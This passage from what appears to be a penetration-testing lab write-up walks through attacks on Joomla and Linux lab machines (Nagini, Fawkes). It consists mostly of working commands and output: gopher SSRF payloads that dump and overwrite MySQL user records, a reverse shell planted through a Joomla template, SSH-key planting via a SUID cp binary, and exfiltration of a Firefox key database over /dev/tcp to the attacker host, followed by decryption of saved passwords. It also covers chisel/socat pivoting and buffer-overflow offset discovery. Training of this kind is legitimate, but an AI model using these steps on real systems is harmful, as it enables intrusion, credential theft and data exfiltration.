\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; select name,username,email,password from joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%43%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%6e%61%6d%65%2c%75%73%65%72%6e%61%6d%65%2c%65%6d%61%69%6c%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

```

Finally we can see the output.

![](/assets/images/2024-08-17-eCPPTv2-simulation/finally-output.png)

Let's try to crack the password with John:

```
 john -w:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

```

At this point of SSRF vulnerability we can do more things, for example since we have privileges to be able to list the database we can try to change database values. We can try to change the password of the **joomla** site administrator user.

```
echo -n "password123" | md5sum
482c811da5d5b4bc6d497ffa98491e38  -

python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%34%38%32%63%38%31%31%64%61%35%64%35%62%34%62%63%36%64%34%39%37%66%66%61%39%38%34%39%31%65%33%38%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

```

![](/assets/images/2024-08-17-eCPPTv2-simulation/update.png)


Finally, we can access in the joomla panel to the administrator.

![](/assets/images/2024-08-17-eCPPTv2-simulation/panel-administrator.png)


To gain access to the machine with an interactive terminal it is quite simple in joomla. In the path **Extension>Tamplates>Tamplates>Protostar>Error.php** we can do the following:

![](/assets/images/2024-08-17-eCPPTv2-simulation/error.php.png)


To gain access we need socat to stay listening for a connection on port 4343 to redirect on the attacking machine.

```
Aragog
 
root@Aragog:~# ./socat TCP-LISTEN:4343.fork TCP:192.168.1.21:443


Attacker

nc -nlvp 443
listening on [any] 443 ...

```

Finally, we can search for a page that does not exist in order to get an error.

![](/assets/images/2024-08-17-eCPPTv2-simulation/web-error.png)

```
 nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 59596
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ 
```

## Got Root

We found the following:

```
www-data@Nagini:/var/www/html/joomla$ ls -la /home/snape/
total 40
drwxr-xr-x 4 snape snape 4096 Aug 23 22:22 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw------- 1 snape snape  780 Aug 26 19:52 .bash_history
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
drwxr-xr-x 3 snape snape 4096 Aug 23 20:15 .local
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
-rw-r--r-- 1 snape snape  565 Aug 23 20:58 authorized_keys
www-data@Nagini:/var/www/html/joomla$ cat /home/snape/.creds.txt 
TG92ZUBsaWxseQ==
www-data@Nagini:/var/www/html/joomla$ cat /home/snape/.creds.txt | base64 -d; echo
Love@lilly
www-data@Nagini:/var/www/html/joomla$ su snape
Password: 
snape@Nagini:/var/www/html/joomla$ 
```
The first binary is interesting, appears to be the **cp** binary but with SUID permissions:
```
snape@Nagini:/var/www/html/joomla$ find / -perm -4000 2> /dev/null | xargs ls -al
-rwsr-xr-x 1 hermoine hermoine   146880 Apr  4  2021 /home/hermoine/bin/su_cp
-rwsr-xr-x 1 root     root        54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root     root        44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root     root        51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root     root        63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root     root        63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root     root        34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-- 1 root     messagebus  51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root     root       436552 Feb  1  2020 /usr/lib/openssh/ssh-keysign
```

If we can run **cp** with owner privileges, we can manage to sneak our ssh public key into your **authorized_keys**. In this way:

```
snape@Nagini:~$ /home/hermoine/bin/su_cp authorized_keys /home/hermoine/.ssh/authorized_keys
snape@Nagini:~$ 

proxychains ssh hermoine@10.10.0.129
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:22-<><>-OK
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 23 21:02:19 2024 from 10.10.0.128
hermoine@Nagini:~$ whoami
hermoine
hermoine@Nagini:~$
```

We found this in personal directory of **hermoine**:

```
hermoine@Nagini:~$ ls -la .mozilla/
extensions/          firefox/             systemextensionsdev/ 
hermoine@Nagini:~$ ls -la .mozilla/firefox/
total 28
drwx------  5 hermoine hermoine 4096 Jun  1  2019  .
drwx------  5 hermoine hermoine 4096 Jun  1  2019  ..
drwx------  4 hermoine hermoine 4096 Apr  4  2021 'Crash Reports'
drwx------  2 hermoine hermoine 4096 Jun  1  2019 'Pending Pings'
drwx------ 14 hermoine hermoine 4096 Aug 23 22:15  g2mhbq0o.default
-rw-r--r--  1 hermoine hermoine   54 Jun  1  2019  installs.ini
-rw-r--r--  1 hermoine hermoine  175 Jun  1  2019  profiles.ini
hermoine@Nagini:~$ ls -la .mozilla/firefox/g2mhbq0o.default/
total 13092
drwx------ 14 hermoine hermoine    4096 Aug 23 22:15 .
drwx------  5 hermoine hermoine    4096 Jun  1  2019 ..
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 .parentlock
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 AlternateServices.txt
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 ClientAuthRememberList.txt
-rw-r--r--  1 hermoine hermoine       0 Nov 19  2020 SecurityPreloadState.txt
-rw-r--r--  1 hermoine hermoine      64 Apr  4  2021 SiteSecurityServiceState.txt
-rw-------  1 hermoine hermoine    3560 Apr  4  2021 addonStartup.json.lz4
-rw-r--r--  1 hermoine hermoine    1923 Apr  4  2021 addons.json
-rw-------  1 hermoine hermoine  338425 Sep 11  2019 blocklist.xml
drwx------  2 hermoine hermoine    4096 Dec 20  2020 bookmarkbackups
-rw-------  1 hermoine hermoine     216 Apr  4  2021 broadcast-listeners.json
-rw-------  1 hermoine hermoine  294912 Dec 20  2020 cert9.db
-rw-------  1 hermoine hermoine      83 Apr  4  2021 cert_override.txt
-rw-------  1 hermoine hermoine     160 Apr  4  2021 compatibility.ini
-rw-------  1 hermoine hermoine     939 Jun  1  2019 containers.json
-rw-r--r--  1 hermoine hermoine  229376 Apr  4  2021 content-prefs.sqlite
-rw-r--r--  1 hermoine hermoine  524288 Apr  4  2021 cookies.sqlite
drwx------  3 hermoine hermoine    4096 Apr  4  2021 crashes
drwx------  4 hermoine hermoine    4096 Apr  4  2021 datareporting
-rw-r--r--  1 hermoine hermoine       2 Apr  4  2021 enumerate_devices.txt
-rw-------  1 hermoine hermoine    1301 Apr  4  2021 extension-preferences.json
drwx------  2 hermoine hermoine    4096 Jun  1  2019 extensions
-rw-------  1 hermoine hermoine   47846 Apr  4  2021 extensions.json
-rw-r--r--  1 hermoine hermoine 5242880 Apr  4  2021 favicons.sqlite
drwx------  3 hermoine hermoine    4096 Apr  4  2021 features
-rw-r--r--  1 hermoine hermoine  262144 Apr  4  2021 formhistory.sqlite
drwx------  2 hermoine hermoine    4096 Apr  4  2021 gmp
drwxr-xr-x  3 hermoine hermoine    4096 Nov 19  2020 gmp-gmpopenh264
-rw-------  1 hermoine hermoine     820 Dec 20  2020 handlers.json
-rw-------  1 hermoine hermoine  294912 Jun  2  2019 key4.db
lrwxrwxrwx  1 hermoine hermoine      18 Apr  4  2021 lock -> 192.168.1.54:+6319
-rw-------  1 hermoine hermoine    1072 Apr  4  2021 logins-backup.json
-rw-------  1 hermoine hermoine     593 Apr  4  2021 logins.json
drwx------  2 hermoine hermoine    4096 Jun  1  2019 minidumps
-rw-r--r--  1 hermoine hermoine   98304 Apr  4  2021 permissions.sqlite
-rw-------  1 hermoine hermoine     872 Jun  1  2019 pkcs11.txt
-rw-r--r--  1 hermoine hermoine 5242880 Apr  4  2021 places.sqlite
-rw-------  1 hermoine hermoine     172 Oct 29  2020 pluginreg.dat
-rw-------  1 hermoine hermoine   16239 Apr  4  2021 prefs.js
-rw-r--r--  1 hermoine hermoine   65536 Apr  4  2021 protections.sqlite
drwx------  2 hermoine hermoine    4096 Apr  4  2021 saved-telemetry-pings
-rw-------  1 hermoine hermoine     387 Apr  4  2021 search.json.mozlz4
drwxr-xr-x  2 hermoine hermoine    4096 Oct 29  2020 security_state
-rw-r--r--  1 hermoine hermoine       2 Apr  4  2021 serviceworker.txt
-rw-------  1 hermoine hermoine     288 Apr  4  2021 sessionCheckpoints.json
-rw-------  1 hermoine hermoine    1297 Apr  4  2021 sessionstore.jsonlz4
-rw-------  1 hermoine hermoine      18 Oct 29  2020 shield-preference-experiments.json
-rw-------  1 hermoine hermoine      84 Jun  1  2019 shield-recipe-client.json
drwxr-xr-x  5 hermoine hermoine    4096 Jun  1  2019 storage
-rw-r--r--  1 hermoine hermoine    5632 Apr  4  2021 storage.sqlite
-rwx------  1 hermoine hermoine      29 Jun  1  2019 times.json
drwx------  4 hermoine hermoine    4096 Apr  4  2021 weave
-rw-r--r--  1 hermoine hermoine  589824 Apr  4  2021 webappsstore.sqlite
-rw-------  1 hermoine hermoine     338 Apr  4  2021 xulstore.json
hermoine@Nagini:~$ 
```
Having this folder with these files is a risk because we can get to decrypt the user and passwords of this **firefox** account using a github tool, as follows:

link: [firepwd](https://github.com/lclevy/firepwd)

first we need to transfer the **key4.db** and **profiles.json** files to the **firepwd* directory:

```
root@Aragog:~# ./socat TCP-LISTEN:4343.fork TCP:192.168.1.21:443

hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat < key4.db > /dev/tcp/10.10.0.128/4343

 nc -nlvp 443 > key.db
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 59662
❯ ls key.db
 key.db

```

Command output:

```
ls
 mozilla_db   venv   firepwd.py   key4.db   LICENSE   logins.json   mozilla_pbe.pdf   mozilla_pbe.svg   readme.md   requirements.txt
❯ python3 firepwd.py
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```

Root

```
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ su root
Password: 
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# whoami
root
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# 
```

Remember to transfer your public key to the root **.ssh**.


# Fawkes

Now it's our turn to engage the **Fawkes** machine, the level is rising...

Now we are on the Nagini machine with the root user, at this point we run **hostname -I** to see other interfaces in order to scan them for more visible computers within the other networks, for this we have to change the IP of the **hostDiscovery.sh** script. 

We realize that there is another **192.168.100.130**.

```
root@Nagini:~# hostname -I
192.168.100.130 10.10.0.129 
```
We change whit another IP:

```
#!/bin/bash

## SIGINT

cleanup(){

        echo -e "\nBYE..\n"
        exit 1
}


trap cleanup SIGINT


## Taget 10.10.0.128

echo -e "\nScanning in the network...\n"

for ipAddress in $(seq 1 254); do
        for port in 21 22 80 443 445 8080; do

                timeout 1 bash -c "echo '' > /dev/tcp/192.168.100.$ipAddress/$port" &> /dev/null && echo "[+] Host: 192.168.100.$ipAddress - PORT $port - OPEN" &
        done
done; wait

echo -e "\n All Already :)\n"
```

Output

```
root@Nagini:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 192.168.100.1 - PORT 445 - OPEN
[+] Host: 192.168.100.128 - PORT 21 - OPEN
[+] Host: 192.168.100.128 - PORT 80 - OPEN
[+] Host: 192.168.100.130 - PORT 22 - OPEN
[+] Host: 192.168.100.130 - PORT 80 - OPEN
[+] Host: 192.168.100.128 - PORT 22 - OPEN

 All Already :)

root@Nagini:~# 
```

Now we have to transfer CHISEL and SOCAT . It is very important to have the same configuration if we want to see the **Fawkes - 192.168.100.128** machine on our attacker machine.

1- Chisel Server in our attacker machine:

```
 ./chisel server --reverse -p 1234
2024/08/27 18:36:15 server: Reverse tunnelling enabled
2024/08/27 18:36:15 server: Fingerprint S09fQ8nC8q9+eLcjEThZMKnPWlSWo2BbiAaCrBr1doA=
2024/08/27 18:36:15 server: Listening on http://0.0.0.0:1234
2024/08/27 18:37:40 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/08/27 18:47:38 server: session#2: tun: proxy#R:127.0.0.1:8888=>socks: Listening
```

2- Connect with chisel the machine **Aragog** on the server chisel

```
root@Aragog:~# ./chisel client 192.168.1.21:1234 R:socks
2024/08/27 22:07:40 client: Connecting to ws://192.168.1.21:1234
2024/08/27 22:07:40 client: Connected (Latency 827.02µs)

```

3- Create other ssh connection in the **Aragog** machine for this:

```
root@Aragog:~# ./socat TCP-LISTEN:5656.fork TCP:192.168.1.21:1234

```
4- Create ssh connection on the **Nagini** machine and connect to the chisel client on the chisel server of our attacking machine.

```
root@Nagini:~# ./chisel client 10.10.0.128:5656 R:8888:socks
```

El último paso es modificar **/etc/proxychains.conf**, in the following way:

```
dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```

And we are ready to perform the scanning of the **Fawkes** machine.

## ScanReport

We found this in nmap scan:

```
seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 192.168.100.128 2>&1 | grep "tcp open"

22/tcp open  ssh
80/tcp open  http
21/tcp open  ftp
2222/tcp open  EtherNetIP-1
9898/tcp open  monkeycom
```

First we try to connect with anonymous on the ftp server, to know if it is enabled and see what can be inside.

```
proxychains ftp 192.168.100.128
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:21-<><>-OK
Connected to 192.168.100.128.
220 (vsFTPd 3.0.3)
Name (192.168.100.128:arc4he): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

It worked and we found this:

```
ftp> dir
229 Entering Extended Passive Mode (|||18531|)
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:18531-<><>-OK
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
^C
receive aborted. Waiting for remote to finish abort.
226 Directory send OK.
500 Unknown command.
73 bytes received in 00:01 (0.04 KiB/s)
ftp> binary
200 Switching to Binary mode.
ftp> get ser|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:34382-<><>-OK

receive aborted. Waiting for remote to finish abort.
17 bytes received in 00:01 (0.01 KiB/s)

500 Unknown command.
ftp> get server_hogwarts
local: server_hogwarts remote: server_hogwarts
229 Entering Extended Passive Mode (|||31028|)
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:31028-<><>-OK
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
100% |*******************************************************************************************************************************************|   689 KiB   32.83 KiB/s  - stalled 

ls server_hogwarts
 server_hogwarts

```

We did a bit of fiddling with this binary and found out that it is a server that is hosted on port 9898 of the machine you run it on, it looks like it is running on the **Fawkes** machine.

```
❯ file ./server_hogwarts
./server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped

strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7fffffffe1b0 /* 41 vars */) = 0
[ Process PID=2030374 runs in 32 bit mode. ]
brk(NULL)                               = 0x80e6000
brk(0x80e67c0)                          = 0x80e67c0
set_thread_area({entry_number=-1, base_addr=0x80e62c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="parrot", ...}) = 0
readlink("/proc/self/exe", "/home/arc4he/Desktop/Arc4he/Pivo"..., 4096) = 52
brk(0x81077c0)                          = 0x81077c0
brk(0x8108000)                          = 0x8108000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, ^Cstrace: Process 2030374 detached
 <detached ...>

❯ ./server_hogwarts
```

We try to connect on localhost and we see the following:

```
 nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 

```

At this point we can even think about the possibility of a buffer overflow attack for the following 32-bit binary, le's try this **gdb**:

```
python3 -c 'print("A"*150)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


gdb ./server_hogwarts -r
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcb9c ('A' <repeats 150 times>, "\n")
EBX: 0x41414141 ('AAAA')
ECX: 0xffffcde0 ('A' <repeats 14 times>, "\n")
EDX: 0xffffcc24 ('A' <repeats 14 times>, "\n")
ESI: 0x80b3158 ("../csu/libc-start.c")
EDI: 0xffffd158 ("\nEnter your spell: ")
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcc10 ('A' <repeats 34 times>, "\n")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffcc10 ('A' <repeats 34 times>, "\n")
0004| 0xffffcc14 ('A' <repeats 30 times>, "\n")
0008| 0xffffcc18 ('A' <repeats 26 times>, "\n")
0012| 0xffffcc1c ('A' <repeats 22 times>, "\n")
0016| 0xffffcc20 ('A' <repeats 18 times>, "\n")
0020| 0xffffcc24 ('A' <repeats 14 times>, "\n")
0024| 0xffffcc28 ("AAAAAAAAAA\n")
0028| 0xffffcc2c ("AAAAAA\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```

It seems that the code in this field is not sanitized. Now we try to obtain the offset:

```
We create 1024 characters and enter them in the apparently vulnerable field:

gdb-peda$ pattern create 1024
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'
gdb-peda$ 


nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC


We found the offset:

gdb-peda$ pattern offset $eip
1094205761 found at offset: 112

```

We check the program protections:

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda$ 
```

We can see NX(Non-Executable) disabled this is an error because we can execute malicious code in the memory. To find out if we have control of the **$eip** we can do the following:

```
python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

